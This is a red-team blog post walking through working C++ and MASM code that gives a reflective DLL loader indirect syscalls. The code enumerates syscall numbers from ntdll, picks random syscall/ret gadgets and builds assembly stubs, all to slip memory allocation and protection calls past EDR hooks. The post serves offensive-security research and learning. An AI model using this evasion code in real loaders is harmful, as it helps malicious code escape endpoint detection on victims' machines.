---
title: "Reflective DLL got Indirect Syscall skills"
date: 2024-02-12T18:45:29+01:00
draft: false
toc: false
images:
tags:
  - untagged
---

![Untitled](/dllsyscalls/Untitled.jpeg)

Ciao World, since I can’t get enough of playing around with the Reflective DLL that inspired the very first blog during the Christmas Holiday, after the [YOLO Loader](https://oldboy21.github.io/posts/2024/01/yolo-you-only-load-once/) I decided to grant the little nasty DLL a new super-power: **Indirect syscalls**

{{< rawhtml >}}
<img src=https://media1.giphy.com/media/7JO6BhBHo67WKYXfAO/giphy.gif?cid=7941fdc6xcjd63nkqoczj2yl0oantzlwia2pr7ea2ml4kqdz&ep=v1_gifs_search&rid=giphy.gif&ct=g class="center" alt="animated">
{{< /rawhtml >}}

So what I will be addressing here is: 
- Indirect syscall: why and (mostly) references
- SSN enum and PIC challenges
- 1 tb of MASM

## Disclaimer

I write code and implement techniques for research and learning purposes only. Not trying to claim anything, just humbly sharing knowledge, experiences and code 😀 feel always free to reach out for any doubts or question. 

# Indirect Syscalls

As I mentioned when I published my little [POC](https://github.com/oldboy21/SyscallMeMaybe) using indirect syscalls to pop a calc.exe, there are already looots of resources that explain pretty well the theory behind user-land hooks and direct/indirect syscall technique. I will make a nice list at the end of this section for you but for now I will just try to give a little introduction to the topic. 

### The Problem

Not only my Reflective DLL gets new skills, also EDRs do. One of the few things that in the past years has been annoying the Red Teamers (and hopefully the so-called bad guys) is **UserLand-Hooks.** 

Some of the Win32 APIs needs to politely step into kernel-mode in order to achieve what they want. Among these we have **VirtualAlloc, ReadFile, WriteFile, etc.** The gate to the kernel world is the syscall instruction (within ntdll.dll). 

While the execution flow of our process is transitioning between [user-mode and kernel-mode](https://learn.microsoft.com/nl-nl/windows-hardware/drivers/gettingstarted/user-mode-and-kernel-mode) the EDR is able to put itself in between and check what are the intentions of the APIs before letting the execution move forward. 

Someone once said I am good with metaphor or examples so: 

{{< rawhtml >}}
<img src=/dllsyscalls/Untitled%201.jpeg class="center">
{{< /rawhtml >}}

*Imagine you are a really suspicious API (e.g. VirtualAlloc) that is about to take a flight to somewhere warm (which is the beautiful kernel-mode). So you walk into the airport and before stepping into the aircraft (which in this example is the syscall) you meet the EDR wearing clothes of Airport security. What the EDR wants to do before letting you jump on the aircraft is to check your luggage. As Win32 API you act bit surprised and say: I just have a LPVOID, couple of DWORD and a SIZE_T, check_in desk said it was allowed. Still the EDR opens your bags and decides whether you planning to do something nasty:* **User-land hooks.**

### The Solution

Basing on the little story above: 

**Direct syscalls:** You buy your own aircraft, aka you implement few assembly instructions to execute the syscall from within the process.

**Indirect-syscall:** You jump the fence at the airport and you just board as the other passengers bypassing the airport security, aka you build a little assembly stub to jump to the syscall instruction within ntdll.dll. 

### The Resources

I hope that at least I made you laugh a bit and you also have an idea of what I am trying to achieve here. As promised a list of GREAT resources to learn more about direct/indirect syscalls: 

- [Direct Syscalls vs Indirect Syscalls](https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls) by [@VirtualAllocEx](https://twitter.com/VirtualAllocEx)
- [Direct Syscalls: A journey from high to low](https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low) by [@VirtualAllocEx](https://twitter.com/VirtualAllocEx)
- [Retrieving Syscall ID with Hell's Gate, Halo's Gate, FreshyCalls and Syswhispers2](https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/#user-mode-vs-kernel-mode) by Alice Climent-Pommeret
- [Calling Syscalls Directly from Visual Studio to Bypass AVs/EDRs](https://www.ired.team/offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs) by [spotheplanet](https://twitter.com/spotheplanet)
- [Combining Direct System Calls and sRDI to bypass AV/EDR](https://www.outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/) by [Cornelis](https://www.outflank.nl/blog/author/cornelis/)

And many more. Most of them do refer to really interesting others so this list is definitely a good start to dive deeper into the topic. 

# Reflective DLL bypassing Airport Security

Now that we have an idea of what this “indirect syscall” super power is, why would it be nice to grant it to my Reflective DLL? 

Well as I mentioned [here](https://oldboy21.github.io/posts/2023/12/all-i-want-for-christmas-is-reflective-dll-injection/)  in order to work properly the Reflective DLL has to perform all the loading tasks to load itself into the memory of the target process. These loading tasks also entail the use of VirtualAlloc and VirtualProtect Win32 APIs which are among those that gets hooked and inspected by the EDRs. Therefore indirect syscall capabilities would definitely help the Reflective DLL to be more stealth during and after the loading process 😊

### Retrieving SSNs

Since you have read all the suggested references above you know that the first two instructions of the syscall stub we have to implement look like this: 

```nasm
mov r10, rcx
mov eax, 18 ;example SSN
...
```

The value that is moved within the EAX register is a (system service number) SSN, which is a unique function identifier. Those identifier change across the different Windows versions/builds, hence one of the challenges for who wanted to implement user-land hooking bypass via direct/indirect syscalls has always been the enumeration of these SSNs. The idea is to do that at run-time, as it can be way more solid approach than hardcoding SSN basing on the target OS version. 

Different techniques have been explored for the runtime SSN enumeration task: 

- [Hell’s Gate](https://github.com/am0nsec/HellsGate)
- [Halo’s Gate](https://blog.sektor7.net/#!res/2021/halosgate.md)
- [FreshyCalls](https://github.com/crummie5/FreshyCalls)
- [Syswhispers2](https://github.com/jthuraisamy/SysWhispers2)
- [Syswhispers3](https://github.com/klezVirus/SysWhispers3)
- [Nice overview of those mentioned above](https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/#user-mode-vs-kernel-mode)

I liked them all ❤️  however I have found inspiration only looking at the latest syswhisper3 techniques and FreshyCalls. An interesting read that definitely motived my approach was the article by Klezvirus: [https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/](https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/)

In the end what I have decided to implement was a Position Indipendent Code that would retrieve the address of all the **Zw** functions within the DLL and sort them by address, finally retrieve the needed amount of pseudo-random addresses pointing to syscall/ret instructions to fake the function the reflective DLL is invoking at execution time (e.g. invoking VirtualAlloc via syscall/ret instruction found in the implementation of ZwAccessCheck). 

{{< rawhtml >}}
<img src=https://media1.giphy.com/media/1ziiQ8TVfLgeGWUOFx/giphy.gif?cid=7941fdc6y1pf1309dgcpgkkrjqwgvmqstfjenwu1qphvue9p&ep=v1_gifs_search&rid=giphy.gif&ct=g class="center" alt="animated">
{{< /rawhtml >}}


A position dependent version of the code I want to implement can be found in my repo [here](https://github.com/oldboy21/SyscallMeMaybe/blob/3f5c9704cf88f209c8b9e27d9c3ab02aa472707b/SyscallMeMaybe/SyscallMeMaybe.cpp#L133) 🙂

Given the fact I had already played around with indirect syscalls, I had already in mind what the position independent version of that code would look like and the challenges that I would have had (and now I wish I did):

- Lack of structures like unordered_map and functions like sort()
- Inability to generate pseudo-random numbers
- Global variable to refer from MASM syscall stub

There was also a little challenge hidden (of course) that popped up during development but let’s just  jump into the code. 

First things first, I had defined a little structure that would hold the SSN, syscall/ret address and Function address of the syscalls I wanted to invoke: 

```cpp
typedef struct _SYSCALL_ENTRY {

    FARPROC funcAddr;
    PBYTE sysretAddr;
    int SSN;

} SYSCALL_ENTRY, * PSYSCALL_ENTRY;
```

After that I have defined a new function that would take as input the HANDLE to the NTDLL module and a pointer to a SYSCALL_ENTRY structure defined within the ReflectiveFunction that would hold **the results of the SSN enumeration**. The first task of this function is to parse the EAT of the NTDLL.DLL module and match all the functions that starts with “**Zw**”. Let’s take a look a the snippet taking care of this task: 

 

```cpp
void RetrieveZwFunctions(IN HMODULE hModule, IN PSYSCALL_ENTRY syscalls) {

    PBYTE pBase = (PBYTE)hModule;

    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return;

    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return;

    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    //variables for syscall che bello stackstring
    CHAR zw[] = {'Z','w'};
    CHAR ZwAllocateVirtualMemory[] = { 'Z', 'w', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    CHAR ZwProtectVirtualMemory[] = { 'Z', 'w', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    CHAR ZwFlushInstructionCache[] = {'Z','w','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e','\0'};
    int zwCounter = 0;
    int syscallEntries = 0;
    DWORD syscallHalf[500] = { 0 };
    PBYTE functionAddress = NULL;
    uintptr_t addressValue = 0;
    DWORD baseAddress = 0x0;
    DWORD temp = 0x0;

    // looping through all the exported functions
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        //function name 
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        // new custom compare string that takes as parameter the number of chars to match
        if (ComprareNStringASCII(zw, pFunctionName, 2)) {
            functionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
            //here i have to fill the struct with function names, address of syscall/ret and ssn
            addressValue = (uintptr_t)functionAddress;
            syscallHalf[zwCounter] = (DWORD) (addressValue & 0xFFFFFFFF);
            zwCounter++;
         
            if (ComprareStringASCII(ZwAllocateVirtualMemory, pFunctionName)) {
                //retrieve the address in memory of the function we want to execute
                //the other params of the SYSCALL_ENTRY struct are initialized to null for now
                syscalls[0] = {(FARPROC)functionAddress, NULL, 0};
                syscallEntries++;
            
            }
            if (ComprareStringASCII(ZwProtectVirtualMemory, pFunctionName)) {
                
                syscalls[1] = { (FARPROC)functionAddress, NULL, 0 };
                syscallEntries++;
            
            }
            if (ComprareStringASCII(ZwFlushInstructionCache, pFunctionName)) {

                syscalls[2] = { (FARPROC)functionAddress, NULL, 0 };
                syscallEntries++;

            }
        }
        
    }

[...]
```

Nothing too crazy, since this is basically what we saw in the previous blogs as well. However, before moving forward, something to pay double attention to is: 

```cpp
DWORD syscallHalf[500] = { 0 }; //array of DWORD called syscallHalf
[...]
functionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
[...]
addressValue = (uintptr_t)functionAddress;
syscallHalf[zwCounter] = (DWORD) (addressValue & 0xFFFFFFFF); //saving the function address excluding 4 bytes
```

These lines above are about the unexpected challenge I mentioned before, because as we all know on 64-bit systems a DWORD is not big enough to hold a memory address. So why would I instead just cut the address in half and save it in a DWORD array?   

{{< rawhtml >}}
<img src=/dllsyscalls/Untitled.png class="center">
{{< /rawhtml >}}

At first I thought I had messed up some imports or external references and started to blame my laziness and lack of order in the things I do, but apparently I was wrong 😌 

and those three errors are related to **filling up the stack space**

{{< rawhtml >}}
<img src=https://media4.giphy.com/media/JwVWLRnZkh2M0/giphy.gif?cid=7941fdc66eeci78xnqv7kns5vsytppxx4q6bd4qz436f5bv9&ep=v1_gifs_search&rid=giphy.gif&ct=g class="center" alt="animated">
{{< /rawhtml >}}

After looking little around I have found that: 

{{< rawhtml >}}
<img src=/dllsyscalls/Untitled%201.png class="center">
{{< /rawhtml >}}

And that made **a lot of sense** all of a sudden, being position independent code it has to rely on stack variables and since my idea was to grab all the **Zw** functions and sort them to figure the SSNs, I was making use of way too much memory on the stack. Annoying, but despite the other techniques for SSN retrieval (Hell’s Gate, …) would have solved this problem, I decided to give it an extra thought. 

At first I had tried just to change the linker options so that I could increase the reserved space for the stack manipulating the [/STACK linker option](https://learn.microsoft.com/en-us/cpp/build/reference/stack-stack-allocations?view=msvc-170) to realize pretty quickly that of course

{{< rawhtml >}}
<img src=/dllsyscalls/Untitled%202.png class="center">
{{< /rawhtml >}}

But then I thought: why do I need the full address when I can just sort basing on the 4 least significant bytes of the memory address?  🙀 

Being inside the limited space of the virtual space of a single process and being just the memory space allocated for a single module in memory, what I am thinking should work: 

{{< rawhtml >}}
<img src=/dllsyscalls/Untitled%203.png class="center">
{{< /rawhtml >}}

As soon as I have put the SYSCALL_ENTRY struct a side for a moment and started working with only the DWORD array, the error was gone (could’ve just done the math but it was fun moment) 🌈

And for *putting the SYSCALL_ENTRY a side* I mean I had used that only for the 3 **Zw** functions I needed and not to keep the full list of the address I had to sort, for which task I instead used the DWORD infamous array. 

Cool, size issues were solved, so now as recap at this point we have: 

- DWORD array with the 4 least significant bytes of all the Zw function addresses
- SYSCALL_ENTRY array of 3 elements holding the memory address of the Zw functions I needed for the DLL loading tasks

Next task is to sort the DWORD array, with a very ugly Bubble Sort implementation 😀

```cpp
//bubble sort really slow sorting bam bam bam
for (int i = 0; i < zwCounter; i++) {
    for (int j = 0; j < zwCounter - 1 - i; j++) {
        if (syscallHalf[j] > syscallHalf[j + 1]) {
            temp = syscallHalf[j + 1];
            syscallHalf[j + 1] = syscallHalf[j];
            syscallHalf[j] = temp;
        }
    }
}
```

Now we can figure the SSN of our functions **by looping through the DWORD array and compare each entry with the (4 bytes least significant) half of the address I have retrieved before from the EAT of the ZwAllocateVirtualMemory,  ZwProtectVirtualMemory and ZwFlushInstructionCache functions**. 

```cpp
//here i can go through the list of the functions looking for what i want and then match it 
//the index at the match it is the SSN 
for (int i = 0; i < zwCounter -1; i++) {
    
    for (int j = 0; j < syscallEntries; j++) {
    
        //recycling variables here for comparing purposes 
        addressValue = (uintptr_t)syscalls[j].funcAddr;
        //if the address of the syscall we want matches any half of those we want
        //we know that's the right SSN
        if (syscallHalf[i] == (DWORD)(addressValue & 0xFFFFFFFF)) {
            syscalls[j].SSN = i;
            
        }
    }

}
```

Bello, looking at the SYSCALL_ENTRY structure now the only missing parameter is the address of a “random”  syscall/ret instructions within ntdll.dll I will be jumping to at execution time.

I could not rely on external functions that returns pseudo-random number so my approach was the following: 

```cpp
//address where the DLL is been written in memory is pretty much 
//expected to be different every time
ULONG_PTR currentAddress = (ULONG_PTR)&RetrieveZwFunctions;
while (syscalls[0].sysretAddr == NULL && syscalls[1].sysretAddr == NULL) {
    
    syscalls[0].sysretAddr = retrieveSCAddr((PBYTE) ((uintptr_t)baseAddress << 32 | syscallHalf[generateRandomFromAddress(currentAddress)]));
    currentAddress = currentAddress + 46; //static little jump with no reference whatsoever to motogp
    syscalls[1].sysretAddr = retrieveSCAddr((PBYTE)((uintptr_t)baseAddress << 32 | syscallHalf[generateRandomFromAddress(currentAddress)]));
    currentAddress = currentAddress + 46;
    syscalls[2].sysretAddr = retrieveSCAddr((PBYTE)((uintptr_t)baseAddress << 32 | syscallHalf[generateRandomFromAddress(currentAddress)]));
}
```

Basically retrieving the function address of the function in memory and convert it to a integer within a given range: 

```cpp
int generateRandomFromAddress(ULONG_PTR ptr) {
    uintptr_t address = (uintptr_t)ptr;
    // Extract lower bits from the address and scale to fit the range 1-480
    int randomNumber = ((address >> 3) & 0xFFFFF) % 400 + 1;

    return randomNumber;
}
```

Finally, **use that integer value to pick a “pseudo-random” half-address in the DWORD array, give back to it its most significant half and walk from that address onwards till the syscall/ret instructions are found:** 

```cpp
//retrieve syscall instructions address
PBYTE retrieveSCAddr(PBYTE funcStar) {

    int emergencybreak = 0;
    while (funcStar && emergencybreak < 2048) {
        //taking into account indianess crazyness
        if (funcStar[0] == 0x0f && funcStar[1] == 0x05 && funcStar[2] == 0xc3) {

            return funcStar;
        }
        funcStar++;
        emergencybreak++;
    }
    return NULL;
}
```

bello, I paste here again the full implementation of the **RetrieveZwFunctions** function as reference (also because there won’t be a repository for this, yet): 

```cpp
/*------------------FIND ZW FUNCTIONS------------------*/

void RetrieveZwFunctions(IN HMODULE hModule, IN PSYSCALL_ENTRY syscalls) {

    PBYTE pBase = (PBYTE)hModule;

    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return;

    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return;

    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    //variables for syscall
    CHAR zw[] = {'Z','w'};
    CHAR ZwAllocateVirtualMemory[] = { 'Z', 'w', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    CHAR ZwProtectVirtualMemory[] = { 'Z', 'w', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    CHAR ZwFlushInstructionCache[] = {'Z','w','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e','\0'};
    int zwCounter = 0;
    int syscallEntries = 0;
    DWORD syscallHalf[500] = { 0 };
    PBYTE functionAddress = NULL;
    uintptr_t addressValue = 0;
    DWORD baseAddress = 0x0;
    DWORD temp = 0x0;

    // looping through all the exported functions
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        if (ComprareNStringASCII(zw, pFunctionName, 2)) {
            functionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
            //here i have to fill the struct with function names, address of syscall/ret and ssn
            addressValue = (uintptr_t)functionAddress;
            syscallHalf[zwCounter] = (DWORD) (addressValue & 0xFFFFFFFF);
            zwCounter++;
            //what i still need to do is to retrieve the syscall instruction to jump to
            
            if (ComprareStringASCII(ZwAllocateVirtualMemory, pFunctionName)) {
                
                syscalls[0] = {(FARPROC)functionAddress, NULL, 0};
                syscallEntries++;
            
            }
            if (ComprareStringASCII(ZwProtectVirtualMemory, pFunctionName)) {
                
                syscalls[1] = { (FARPROC)functionAddress, NULL, 0 };
                syscallEntries++;
            
            }
            if (ComprareStringASCII(ZwFlushInstructionCache, pFunctionName)) {

                syscalls[2] = { (FARPROC)functionAddress, NULL, 0 };
                syscallEntries++;

            }
        }
        
    }
    //this base address i need only once
    baseAddress = (DWORD)(addressValue >> 32);
    
    //bubble sort really slow sorting 
    for (int i = 0; i < zwCounter; i++) {
        for (int j = 0; j < zwCounter - 1 - i; j++) {
            if (syscallHalf[j] > syscallHalf[j + 1]) {
                temp = syscallHalf[j + 1];
                syscallHalf[j + 1] = syscallHalf[j];
                syscallHalf[j] = temp;

            }
        }
    
    }

    //here i can go through the list of the half-addresses that i have and pick two 
    //random syscall/ret
    ULONG_PTR currentAddress = (ULONG_PTR)&RetrieveZwFunctions;
    while (syscalls[0].sysretAddr == NULL && syscalls[1].sysretAddr == NULL) {
    
        
        syscalls[0].sysretAddr = retrieveSCAddr((PBYTE) ((uintptr_t)baseAddress << 32 | syscallHalf[generateRandomFromAddress(currentAddress)]));
        currentAddress = currentAddress + 46;
        syscalls[1].sysretAddr = retrieveSCAddr((PBYTE)((uintptr_t)baseAddress << 32 | syscallHalf[generateRandomFromAddress(currentAddress)]));
        currentAddress = currentAddress + 46;
        syscalls[2].sysretAddr = retrieveSCAddr((PBYTE)((uintptr_t)baseAddress << 32 | syscallHalf[generateRandomFromAddress(currentAddress)]));
    }

    //here i can go through the list of the functions looking for what i want and then match it 
    //in my array
    for (int i = 0; i < zwCounter -1; i++) {
        
        for (int j = 0; j < syscallEntries; j++) {
        
            //recycling variables here for comparing purposes 
            addressValue = (uintptr_t)syscalls[j].funcAddr;
            //if the address of the syscall we want matches any half of those we want, we know that's the right SSN
            if (syscallHalf[i] == (DWORD)(addressValue & 0xFFFFFFFF)) {
                syscalls[j].SSN = i;
                
            }
        }
    
    }
}
```

### ASM Syscall Stub

Now that I have all the information I need to invoke the selected functions, I just need to implement the little syscall stub within my Reflective DLL. 

In the project I wrote as [indirect syscall POC](https://github.com/oldboy21/SyscallMeMaybe) I had used the following approach: 

```nasm
.data
EXTERN SSN: DWORD
EXTERN SYSCALLADDR: QWORD

.code 
ZwAllocateVirtualMemory PROC
  mov r10, rcx 
  mov eax, SSN
  jmp SYSCALLADDR
ZwAllocateVirtualMemory ENDP
```

Basically using global external variables that could be referred from the ASM code and invoke the syscall. 

```cpp
//from SyscallMeMaybe.cpp
extern "C" DWORD SSN = 0;
extern "C" QWORD SYSCALLADDR = 0;
```

In this case the approach could not be recycled since the DLL needs to be loaded before being able to refer to global variables in memory. So what now? 

What I thought is that the procedures within the ASM file are invoked just like a normal function from the C code. As any other functions that takes arguments, it expect the latter  to be placed into registers or stack as per the [windows calling convention](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170)

{{< rawhtml >}}
<img src=/dllsyscalls/Untitled%204.png class="center">
{{< /rawhtml >}}

Without diving too much into the calling convention we can expect parameter to be passed like this to the target functions: 

```nasm
    mov rax, rcx ; 1
    mov rax, rdx ; 2
    mov rax, r8 ; 3
    mov rax, r9 ; 4
    mov rax, qword ptr [rsp + 40]  ; 5
    mov rax, qword ptr [rsp + 48]  ; 6
    mov rax, qword ptr [rsp + 56]  ; 7
```

Therefore my thought concluded with the idea that If I define the extern function like this: 

```cpp
EXTERN_C NTSTATUS ZwAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect,
    IN DWORD ssn,
    IN PBYTE syscallret);
```

In the specific case of the ZwAllocateVirtualMemory. I would have found the SSN in **dword ptr [rsp + 56]** and the syscallret address in **qword ptr [rsp + 64].** 

And luckily I was right 😀

Hence I had defined the function within my ASM file as following: 

```nasm
.code 
ZwAllocateVirtualMemory PROC
  mov r10, rcx
  mov eax, dword ptr [rsp + 56]
  jmp qword ptr [rsp + 64]
ZwAllocateVirtualMemory ENDP

ZwProtectVirtualMemory PROC
  mov r10,rcx
  mov eax, dword ptr [rsp + 48]
  jmp qword ptr [rsp + 56]
ZwProtectVirtualMemory ENDP

ZwFlushInstructionCache PROC
  mov r10,rcx 
  mov rax, r9
  jmp qword ptr [rsp + 40]
ZwFlushInstructionCache ENDP

end
```

## Che bello:

{{< rawhtml >}}
<img src=/dllsyscalls/Untitled%205.png class="center">
{{< /rawhtml >}}

## Conclusions and Credits

In this blog post that you hopefully enjoyed I have talked about some ideas to implement Indirect Syscalls in your Reflective DLL. I mentioned quite some blog posts and people during the blog so I won’t do that again here but those blogs are golden, thanks guys <3